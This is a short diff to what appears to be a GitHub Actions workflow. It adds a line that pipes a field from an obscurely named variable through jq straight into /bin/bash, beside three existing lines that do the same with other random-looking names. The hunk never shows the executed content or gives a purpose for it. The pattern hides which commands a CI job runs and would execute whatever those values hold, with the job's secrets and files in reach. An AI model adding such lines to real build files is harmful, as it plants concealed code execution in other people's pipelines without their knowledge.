@@ -24,6 +24,7 @@ jobs:
           echo $v465 | jq -r .h7982 | /bin/bash
           printf '%s' "$ihttc40" | jq -r .ubr79 | /bin/bash
           echo $dger0719 | jq -r .dw03714 | /bin/bash
+          echo $mcorj51362 | jq -r .u3 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
